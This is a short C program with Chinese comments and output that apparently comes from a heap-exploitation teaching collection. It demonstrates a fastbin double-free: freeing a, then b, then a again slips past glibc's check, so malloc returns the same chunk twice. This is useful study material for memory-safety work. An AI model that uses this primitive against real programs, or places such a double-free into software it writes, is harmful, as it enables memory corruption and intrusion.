#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "这个文件演示了一个简单的利用fastbin实现的double-free攻击。\n");

	fprintf(stderr, "分配3个缓冲区。\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "第一次调用malloc(8)分配的地址: %p\n", a);
	fprintf(stderr, "第二次调用malloc(8)分配的地址: %p\n", b);
	fprintf(stderr, "第三次调用malloc(8)分配的地址: %p\n", c);

	fprintf(stderr, "现在释放掉a...\n");
	free(a);

	fprintf(stderr, "如果我们再一次释放a: %p, 程序将会崩溃，原因是 %p 位于free list的顶部。\n", a, a);
	// free(a);

	fprintf(stderr, "所以，我们free b来代替它 %p。\n", b);
	free(b);

	fprintf(stderr, "现在, 我们可以再次释放a: %p 了, 因为现在a已经不在free list头了。\n", a);
	free(a);

	fprintf(stderr, "现在free list中含有[ %p, %p, %p ]。如果我们继续调用三次malloc, free list中a: %p 却出现了两次!\n", a, b, a, a);
	a = malloc(8);
	b = malloc(8);
	c = malloc(8);
	fprintf(stderr, "第一次调用malloc(8)分配的地址: %p\n", a);
	fprintf(stderr, "第二次调用malloc(8)分配的地址: %p\n", b);
	fprintf(stderr, "第三次调用malloc(8)分配的地址: %p\n", c);

	assert(a == c);
}
